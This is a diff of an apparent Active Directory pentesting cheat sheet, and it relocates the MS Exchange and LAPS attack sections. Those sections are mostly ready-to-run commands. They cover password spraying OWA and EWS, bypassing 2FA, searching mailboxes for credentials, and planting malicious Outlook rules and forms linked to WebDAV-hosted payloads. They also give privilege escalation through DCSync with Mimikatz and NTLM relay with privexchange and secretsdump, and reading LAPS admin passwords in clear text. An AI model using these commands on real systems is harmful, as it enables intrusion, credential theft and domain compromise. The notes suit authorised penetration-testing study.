@@ -343,253 +343,6 @@ gpupdate /force #On the target machine if you got normal access already
 net localgroup administrators
 ```
 
-## MS Exchange
-- Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
-- Outlook Forms VBSCript engine is different then the VBA Macro script engine (So disabling macro's wont defend against it)
-
-### Attacking externally
-- Attah path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing
-
-#### Collection of data (OSINT)
-- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
-  - https://github.com/mschwager/fierce
-  - https://www.elevenpaths.com/innovation-labs/technologies/foca
-  - https://github.com/lanmaster53/recon-ng
-  - https://github.com/leebaird/discover
-  - https://github.com/laramies/theHarvester
-
-#### Domain name discovery
-- https://github.com/dafthack/MailSniper
-```
-Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
-```
-- Internal Domain name may be found inside a SSL Certificate
-- https://github.com/dafthack/MailSniper
-
-#### Name scheme fuzzing
-- Create a username list from the OSINT
-- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
-```
-Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii namelist.txt
-```
-
-#### Username Enumeration
-- https://github.com/dafthack/MailSniper
-```
-Invoke-UsernameHarvestOWA -Userlist <TXT> -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile potential_usernames.txt
-```
-
-#### Password discovery
-- https://github.com/dafthack/MailSniper
-```
-Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
-Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
-```
-
-#### Global Address List (GAL) Extraction
-- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
-```
-Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
-```
-- Then you could spray passwords again to get access to more mail accounts!
-
-#### Bypassing 2fa
-- Can check by server responses if supplied password is correct or not.
-- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!
-
-```
-# Access through EWS
-Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
-```
-
-#### Spreading the compromise
-- Pillaging mailboxes for credentials/sensitive data
-  -  https://github.com/milo2012/owaDump (--keyword option)
-  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
-  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
-- Internal phishing
-  - Mail from internal email adresses to targets.
-- Malicious Outlook rules
-  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
-  - Since Outlook 2016 both options are disabled by default
-  - Attack prequisites:
-    - Identification of valid credentials
-    - Exchange Service Access (via RPC or MAPI over HTTP)
-    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
-  - The attack:
-    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
-    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
-      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
-    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
-    - Send the trigger email. 
-- Malicious Outlook Forms
-  - If the path is applied that disables Run Application and Run Script rules this still works!
-  - Attack prequisites:
-    - Identification of valid credentials
-    - Exchange service access 
-  - KB4011091 for outlook 2016 seems to block VBSCript in forms
-  - https://github.com/sensepost/ruler/wiki/Forms
-  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```
-
-### Attacking from the inside
-- All the attacks from the outside works from the inside!
-- https://github.com/dafthack/MailSniper
-
-#### Enumerate all mailboxes
-```
-Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
-```
-
-#### Check access to mailboxes with current user
-```
-Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
-```
-
-#### Read e-mails
-- The below command looks for terms like pass, creds, credentials from top 100 emails
-```
-Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
-```
-
-#### Exchange ActiveSync
-- This attack applies when the DC and Exchange Server are hosted on the same machine
-- https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync/
-
-### MS Exchange escalating privileges
-- Attack is performed cross domain, but can be done inside the domain. Just use the current domain instead of parent domain!
-![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
-
-#### Enumerate if exchange groups exist
-```
-. ./Powerview.ps1
-Get-DomainGroup *exchange* -Domain <DOMAIN>
-```
-
-#### Enumerate membership of the groups
-```
-Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
-Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
-```
-
-#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
-```
-$user = Get-DomainUser -Identity <USER>
-$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
-Add-DomainGroupMember -Identity $group -Members $user -Verbose
-```
-
-#### Add permissions to execute DCSYNC
-```
-Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
-```
-
-#### Execute DCSYNC
-- use ```/all``` instead of ```/user``` to list all users
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
-```
-
-#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
-```
-$user = Get-DomainUser -Identity <USER>
-$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
-Add-DomainGroupMember -Identity $group -Members $user -Verbose
-```
-
-### NTLM Relay MS Exchange abuse
-- https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
-- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
-
-#### The attack using domain credentials
-- https://github.com/dirkjanm/privexchange/
-- Attack takes a minute!
-```
-sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <USER>
-
-python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>
-
-secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
-```
-
-#### The attack without credentials
-- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py first
-- Really vague described in the INE slides. Never tried it either!
-```
-sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
-```
-
-#### Restore ACL's with aclpwn.py
-- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's
-
-```
-python3 aclpwn.py --restore aclpwn.restore
-```
-
-## LAPS
-- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
-- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
-
-#### Check if LAPS is installed on local computer
-```
-Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
-Test-Path HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions #DOESNT WORK? GOTTA CHECK ECPPTX MATERIAL AGAIN
-```
-
-#### Check existence of LAPS in the domain
-```
-Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
-Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
-Get-DomainGPO -Identity *LAPS*
-```
-
-#### Check to which computers the LAPS GPO is applied to
-```
-Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
-Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
-```
-
-#### Check all computers without labs
-```
-Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
-```
-
-#### Check the LAPS configuration
-- https://github.com/PowerShell/GPRegistryPolicy
-- Password complexity, password length, password expiration, Acccount managing LAPS
-- AdmPwdEnabled 1 = local administrator password is managed
-- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
-```
-Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
-```
-
-#### Find all users who can read passwords in clear text machines in OU's
-```
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
-
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
-```
-
-```
-Import-Module AdmPwd.PS.psd1
-Find-AdmPwdExtendedRights -Identity OUDistinguishedName
-```
-
-#### If retured groups, get the users:
-```
-$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
-$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
-$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
-```
-
-#### Read clear-text passwords:
-```
-Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
-Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
-
-#LAPS Powershell cmdlet
-Get-AdmPwdPassword -ComputerName <MACHINE NAME>
-```
-
 
 ## Delegation
 - In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
@@ -1006,6 +759,253 @@ change-lockscreen --webdav \\webdav@80\
 getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
 Export KRB5CCNAME=administrator.ccache
 Psexec.py -k -no-pass <TARGET FQDN>
+```
+
+## MS Exchange
+- Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
+- Outlook Forms VBSCript engine is different then the VBA Macro script engine (So disabling macro's wont defend against it)
+
+### Attacking externally
+- Attah path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing
+
+#### Collection of data (OSINT)
+- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
+  - https://github.com/mschwager/fierce
+  - https://www.elevenpaths.com/innovation-labs/technologies/foca
+  - https://github.com/lanmaster53/recon-ng
+  - https://github.com/leebaird/discover
+  - https://github.com/laramies/theHarvester
+
+#### Domain name discovery
+- https://github.com/dafthack/MailSniper
+```
+Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
+```
+- Internal Domain name may be found inside a SSL Certificate
+- https://github.com/dafthack/MailSniper
+
+#### Name scheme fuzzing
+- Create a username list from the OSINT
+- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
+```
+Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii namelist.txt
+```
+
+#### Username Enumeration
+- https://github.com/dafthack/MailSniper
+```
+Invoke-UsernameHarvestOWA -Userlist <TXT> -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile potential_usernames.txt
+```
+
+#### Password discovery
+- https://github.com/dafthack/MailSniper
+```
+Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
+Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist potential_usernames.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
+```
+
+#### Global Address List (GAL) Extraction
+- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
+```
+Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
+```
+- Then you could spray passwords again to get access to more mail accounts!
+
+#### Bypassing 2fa
+- Can check by server responses if supplied password is correct or not.
+- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!
+
+```
+# Access through EWS
+Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
+```
+
+#### Spreading the compromise
+- Pillaging mailboxes for credentials/sensitive data
+  -  https://github.com/milo2012/owaDump (--keyword option)
+  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
+  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
+- Internal phishing
+  - Mail from internal email adresses to targets.
+- Malicious Outlook rules
+  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
+  - Since Outlook 2016 both options are disabled by default
+  - Attack prequisites:
+    - Identification of valid credentials
+    - Exchange Service Access (via RPC or MAPI over HTTP)
+    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
+  - The attack:
+    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
+    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
+      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
+    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
+    - Send the trigger email. 
+- Malicious Outlook Forms
+  - If the path is applied that disables Run Application and Run Script rules this still works!
+  - Attack prequisites:
+    - Identification of valid credentials
+    - Exchange service access 
+  - KB4011091 for outlook 2016 seems to block VBSCript in forms
+  - https://github.com/sensepost/ruler/wiki/Forms
+  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```
+
+### Attacking from the inside
+- All the attacks from the outside works from the inside!
+- https://github.com/dafthack/MailSniper
+
+#### Enumerate all mailboxes
+```
+Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
+```
+
+#### Check access to mailboxes with current user
+```
+Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
+```
+
+#### Read e-mails
+- The below command looks for terms like pass, creds, credentials from top 100 emails
+```
+Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
+```
+
+#### Exchange ActiveSync
+- This attack applies when the DC and Exchange Server are hosted on the same machine
+- https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync/
+
+### MS Exchange escalating privileges
+- Attack is performed cross domain, but can be done inside the domain. Just use the current domain instead of parent domain!
+![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
+
+#### Enumerate if exchange groups exist
+```
+. ./Powerview.ps1
+Get-DomainGroup *exchange* -Domain <DOMAIN>
+```
+
+#### Enumerate membership of the groups
+```
+Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
+Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
+```
+
+#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
+```
+$user = Get-DomainUser -Identity <USER>
+$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
+```
+
+#### Add permissions to execute DCSYNC
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+```
+
+#### Execute DCSYNC
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
+```
+
+#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
+```
+$user = Get-DomainUser -Identity <USER>
+$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
+```
+
+### NTLM Relay MS Exchange abuse
+- https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
+- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
+
+#### The attack using domain credentials
+- https://github.com/dirkjanm/privexchange/
+- Attack takes a minute!
+```
+sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --escalate-user <USER>
+
+python3 privexchange.py -ah <ATTACKER HOST> <EXCHANGE SERVER> -u Username -d <DOMAIN NAME>
+
+secretsdump.py <DOMAIN>/<USER>@<DC IP> -just-dc
+```
+
+#### The attack without credentials
+- using LLMNR/NBNS/mitm6 spoofing and https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py first
+- Really vague described in the INE slides. Never tried it either!
+```
+sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
+```
+
+#### Restore ACL's with aclpwn.py
+- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's
+
+```
+python3 aclpwn.py --restore aclpwn.restore
+```
+
+## LAPS
+- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
+- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
+
+#### Check if LAPS is installed on local computer
+```
+Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
+Test-Path HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions #DOESNT WORK? GOTTA CHECK ECPPTX MATERIAL AGAIN
+```
+
+#### Check existence of LAPS in the domain
+```
+Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
+Get-DomainGPO -Identity *LAPS*
+```
+
+#### Check to which computers the LAPS GPO is applied to
+```
+Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
+Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
+```
+
+#### Check all computers without labs
+```
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
+```
+
+#### Check the LAPS configuration
+- https://github.com/PowerShell/GPRegistryPolicy
+- Password complexity, password length, password expiration, Acccount managing LAPS
+- AdmPwdEnabled 1 = local administrator password is managed
+- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
+```
+Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
+```
+
+#### Find all users who can read passwords in clear text machines in OU's
+```
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
+```
+
+```
+Import-Module AdmPwd.PS.psd1
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+```
+
+#### If retured groups, get the users:
+```
+$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
+```
+
+#### Read clear-text passwords:
+```
+Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
+Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
+
+#LAPS Powershell cmdlet
+Get-AdmPwdPassword -ComputerName <MACHINE NAME>
 ```
 
 ## DNS Admins
